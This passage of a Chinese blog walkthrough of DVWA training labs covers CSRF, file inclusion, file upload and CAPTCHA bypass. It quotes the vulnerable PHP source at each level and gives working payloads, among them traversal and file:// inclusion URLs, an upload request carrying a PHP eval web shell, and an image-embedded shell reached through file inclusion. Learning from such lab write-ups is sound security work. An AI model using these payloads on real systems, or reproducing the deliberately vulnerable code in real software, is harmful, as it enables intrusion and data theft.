+            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+            // Feedback for the user
+            $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+        &#125;
+        else &#123;
+            // Issue with passwords matching
+            $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        &#125;
+    &#125;
+    else &#123;
+        // Didn&#39;t come from a trusted source
+        $html .= &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+?&gt;
+</code></pre><h3 id="难度：high-2"><a href="#难度：high-2" class="headerlink" title="难度：high"></a>难度：high</h3><p>通过代码审计可以得出以下信息：</p>
+<ol>
+<li>high难度是基于token的身份检验方法</li>
+<li>服务器对客户端发来的账号密码进行验证，验证成功会发送给客户端一个token</li>
+<li>客户端把token存储在cookie或者本地缓存</li>
+</ol>
+<p>也就是说，只有获取token才能CSRF，但是浏览器的跨域问题，不能直接获取，所以比较难利用</p>
+<pre><code>&lt;?php
+if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+    // Get input
+    $pass_new  = $_GET[ &#39;password_new&#39; ];
+    $pass_conf = $_GET[ &#39;password_conf&#39; ];
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) &#123;
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+        // Feedback for the user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    &#125;
+    else &#123;
+        // Issue with passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+// Generate Anti-CSRF token
+generateSessionToken();
+?&gt;
+
+</code></pre><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p>通过impossible难度的代码审计，可以看出对以下做了防御：</p>
+<ol>
+<li>使用PDO技术防御SQL注入</li>
+<li>对于防御CSRF，要求用户输入原始密码，攻击者在不知道原始密码的情况下是无法进行CSRF攻击的（原先）</li>
+</ol>
+<pre><code>&lt;?php 
+
+if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 
+    // Get input 
+    $pass_curr = $_GET[ &#39;password_current&#39; ]; 
+    $pass_new  = $_GET[ &#39;password_new&#39; ]; 
+    $pass_conf = $_GET[ &#39;password_conf&#39; ]; 
+    // Sanitise current password input 
+    $pass_curr = stripslashes( $pass_curr ); 
+    $pass_curr = mysql_real_escape_string( $pass_curr ); 
+    $pass_curr = md5( $pass_curr ); 
+    // Check that the current password is correct 
+    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); 
+    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
+    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR ); 
+    $data-&gt;execute(); 
+    // Do both new passwords match and does the current password match the user? 
+    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; 
+        // It does! 
+        $pass_new = stripslashes( $pass_new ); 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+        // Update database with new password 
+        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; ); 
+        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR ); 
+        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
+        $data-&gt;execute(); 
+
+        // Feedback for the user 
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
+    &#125; 
+    else &#123; 
+        // Issue with passwords matching 
+        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; 
+    &#125; 
+&#125; 
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?&gt;
+
+</code></pre><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="难度：low-3"><a href="#难度：low-3" class="headerlink" title="难度：low"></a>难度：low</h3><p>构造payload：xxx?page=file1.php</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_file_il_low.png" alt="文件包含"></p>
+<p>代码审计后可以观察到，服务端没有做任何限制</p>
+<pre><code>&lt;?php
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+?&gt;
+</code></pre><h3 id="难度：medium-3"><a href="#难度：medium-3" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>使用绝对路径和相对路径构造payload</p>
+<pre><code>http://192.168.113.1/dvwa/vulnerabilities/fi/?page=G:\phpstudy_pro\WWW\DVWA\php.ini
+http://192.168.113.1/dvwa/vulnerabilities/fi/?page=..\..\..\..\WWW\DVWA\php.ini
+</code></pre><p>代码审计后可以观察到，发现对http等进行了一些过滤</p>
+<pre><code>&lt;?php
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+?&gt;
+
+</code></pre><h3 id="难度：high-3"><a href="#难度：high-3" class="headerlink" title="难度：high"></a>难度：high</h3><p>构造payload：</p>
+<pre><code>http://192.168.113.1/dvwa/vulnerabilities/fi/?page=file:///G:/phpstudy_pro/WWW/DVWA/php.ini
+</code></pre><p>代码审计后可以观察到，High级别的代码规定只能包含file开头的文件，看似安全，我们依然可以利用file协议绕过防护策略。</p>
+<pre><code>&lt;?php
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+&#125;
+
+?&gt;
+</code></pre><h3 id="难度：impossible-2"><a href="#难度：impossible-2" class="headerlink" title="难度：impossible"></a>难度：impossible</h3><p>通过代码审计可以观察到：Impossible级别的代码使用了白名单机制进行防护，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
+<pre><code>&lt;?php
+// The page we wish to display
+$file = $_GET[ &#39;page&#39; ];
+// Only allow include.php or file&#123;1..3&#125;.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;
+    // This isn&#39;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+&#125;
+?&gt;
+
+</code></pre><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="难度：low-4"><a href="#难度：low-4" class="headerlink" title="难度：low"></a>难度：low</h3><p>上传一句话木马</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_upload_low.png" alt="文件上传"></p>
+<p>使用蚁剑连接，这里提供蚁剑的github地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject">https://github.com/AntSwordProject</a></p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_upload_low_2.png" alt="文件上传"></p>
+<p>代码审计可以观察到以下问题：</p>
+<ol>
+<li>无限制的上传文件，没有做任何过滤，这是最致命的</li>
+<li>文件上传后，保存在hackable/uploads/ 路径，而且还直接输出</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;
+        // No
+        $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+    &#125;
+    else &#123;
+        // Yes!
+        $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;
+    &#125;
+&#125;
+?&gt;
+</code></pre><h3 id="难度：medium-4"><a href="#难度：medium-4" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>直接上传木马会发现，做了上传文件的限制</p>
+<pre class=" language-text"><code class="language-text">Your image was not uploaded. We can only accept JPEG or PNG images.
+</code></pre>
+<p>所以要想办法绕过，做以下操作绕过</p>
+<ol>
+<li>修改有一句话木马shell.php为shell.png或者shell.jpg</li>
+<li>抓包得到以下数据包，将filename=”shell.png”改成filename=”shell.php”</li>
+<li>再放包</li>
+</ol>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_file_upload_md_1.png" alt="文件上传"></p>
+<pre><code>POST /dvwa/vulnerabilities/upload/ HTTP/1.1
+Host: 192.168.113.1
+Content-Length: 429
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.113.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEdBpaJcCABbwJ0T9
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.113.1/dvwa/vulnerabilities/upload/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=medium; PHPSESSID=70436arr4q4ouusefnic2a08eu
+Connection: close
+------WebKitFormBoundaryEdBpaJcCABbwJ0T9
+Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;
+100000
+------WebKitFormBoundaryEdBpaJcCABbwJ0T9
+Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.png&quot;
+Content-Type: application/x-php
+&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;
+------WebKitFormBoundaryEdBpaJcCABbwJ0T9
+Content-Disposition: form-data; name=&quot;Upload&quot;
+Upload
+------WebKitFormBoundaryEdBpaJcCABbwJ0T9--
+</code></pre><p>代码审计后可以观察到，有以下问题：</p>
+<ol>
+<li>在判断语句那里可以看到，最上传文件的类型做了限制，只能上传jpeg和png类型文件，并且文件大小不超过100000B</li>
+<li>​由于只进行了Content-Type类型校验，所以可以正常上传.png文件，然后再抓包修改文件后缀名为.php</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // File information
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];
+    $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];
+    // Is it an image?
+    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) ) &#123;
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;
+            // No
+            $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+        &#125;
+        else &#123;
+            // Yes!
+            $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;
+        &#125;
+    &#125;
+    else &#123;
+        // Invalid file
+        $html .= &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;
+    &#125;
+&#125;
+?&gt;
+
+</code></pre><h3 id="难度：high-4"><a href="#难度：high-4" class="headerlink" title="难度：high"></a>难度：high</h3><p>使用medium难度的方法还是无法上传木马，这里使用图片马，将图片和木马结合上传到服务器，步骤如下</p>
+<ol>
+<li>随便找张图片，和一句话木马结合。cat 1.jpeg shell.php &gt; shell2.png</li>
+<li>上传shell2.png</li>
+<li>由于shell2.png是图片格式，不能直接用蚁剑连接。利用File Inclusion漏洞访问<em><a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/fi/?page=file:///G:/phpstudy_pro/WWW/dvwa/hackable/uploads/shell2.png">http://192.168.113.1/dvwa/vulnerabilities/fi/?page=file:///G:/phpstudy_pro/WWW/dvwa/hackable/uploads/shell2.png</a></em>能解析php代码</li>
+</ol>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_file_upload_high_1.png" alt="文件上传"></p>
+<p>这里注意用蚁剑连接的时候要加上cookie，在浏览器输入document.cookie复制放到蚁剑即可</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_upload_high_2.png" alt="文件上传"></p>
+<p>代码审计后可以观察到，</p>
+<ol>
+<li>getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</li>
+<li>要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。</li>
+<li>getimagesize函数更是限制了上传文件的文件头必须为图像类型。</li>
+</ol>
+<pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );
+    // File information
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];
+    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) &#123;
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;
+            // No
+            $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
+        &#125;
+        else &#123;
+            // Yes!
+            $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;
+        &#125;
+    &#125;
+    else &#123;
+        // Invalid file
+        $html .= &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;
+    &#125;
+&#125;
+</code></pre><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>Insecure CAPTCHA（不安全的验证码），主要是验证流程出现了逻辑漏洞，而不是谷歌的验证码有问题。这一模块验证码使用的是Google提供的reCAPTCHA服务。</p>
+<p>这里要进行配置，找到config.inc.php文件，修改下面两个地方</p>
+<pre><code>$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#39;;
+
+$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#39;;
+</code></pre><h3 id="难度：low-5"><a href="#难度：low-5" class="headerlink" title="难度：low"></a>难度：low</h3><p>这里直接开始分析源码，可以看出该验证方法分为以下两步：</p>
+<ol>
+<li>先检查验证码是否正确，为step == 1状态</li>
+<li>再检查密码和确认密码</li>
+</ol>
+<p>所以可以直接抓包 将 step=1 改成 step=2,绕过第一步验证码的检验</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_captcha_low.png" alt="验证码"></p>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) &#123;
+    // Hide the CAPTCHA form
+    $hide_form = true;
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39;],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+    // Did the CAPTCHA fail?
+    if( !$resp ) &#123;
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    &#125;
+    else &#123;
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) &#123;
+            // Show next stage for the user
+            $html .= &quot;
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;
+                &lt;/form&gt;&quot;;
+        &#125;
+        else &#123;
+            // Both new passwords do not match.
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        &#125;
+    &#125;
+&#125;
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) &#123;
+    // Hide the CAPTCHA form
+    $hide_form = true;
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) &#123;
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+        // Update database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+        // Feedback for the end user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    &#125;
+    else &#123;
+        // Issue with the passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+
+?&gt;
+
+</code></pre><h3 id="难度：medium-5"><a href="#难度：medium-5" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>通过代码审计可以发现以下：</p>
+<ol>
+<li>medium在low基础上做了优化，在第二步会检查<strong>passed_captcha</strong>变量，也就是第一步是否校验成功，防止在第一步直接绕过</li>
+<li>虽然有<strong>passed_captcha</strong>校验，但是存在问题，<strong>passed_captcha</strong>是通过post提交的，所以我们可以直接通过抓包改<strong>passed_captcha</strong>变量的值</li>
+</ol>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_captcha_md.png" alt="验证码"></p>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) &#123;
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39; ],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) &#123;
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    &#125;
+    else &#123;
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) &#123;
+            // Show next stage for the user
+            $html .= &quot;
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;
+                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;
+                &lt;/form&gt;&quot;;
+        &#125;
+        else &#123;
+            // Both new passwords do not match.
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        &#125;
+    &#125;
+&#125;
+
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) &#123;
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // Check to see if they did stage 1
+    if( !$_POST[ &#39;passed_captcha&#39; ] ) &#123;
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    &#125;
+
+    // Check to see if both password match
+    if( $pass_new == $pass_conf ) &#123;
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+        // Feedback for the end user
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    &#125;
+    else &#123;
+        // Issue with the passwords matching
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+    &#125;
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+?&gt;
+
+</code></pre><h3 id="难度：high-5"><a href="#难度：high-5" class="headerlink" title="难度：high"></a>难度：high</h3><p>通过代码审计后发现：</p>
+<ol>
+<li>将两个步骤合并，无法通过修改<strong>passed_captcha</strong>绕过第一步，避免了我们通过改参数绕过</li>
+<li>但是通过分析可以发现是通过验证<strong>g-recaptcha-response</strong> 和 <strong>HTTP_USER_AGENT</strong>，所以我们通过抓包，即使不验证，也可以通过。等于是绕过两步了。</li>
+</ol>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_captcha_high.png" alt="验证码"></p>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;Change&#39; ] ) ) &#123;
+    // Hide the CAPTCHA form
+    $hide_form = true;
+    // Get input
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+    // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39; ],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+    if (
+        $resp || 
+        (
+            $_POST[ &#39;g-recaptcha-response&#39; ] == &#39;hidd3n_valu3&#39;
+            &amp;&amp; $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] == &#39;reCAPTCHA&#39;
+        )
+    )&#123;
+        // CAPTCHA was correct. Do both new passwords match?
+        if ($pass_new == $pass_conf) &#123;
+            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+            $pass_new = md5( $pass_new );
+
+            // Update database
+            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;;
+            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+            // Feedback for user
+            $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+
+        &#125; else &#123;
+            // Ops. Password mismatch
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        &#125;
+
+    &#125; else &#123;
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
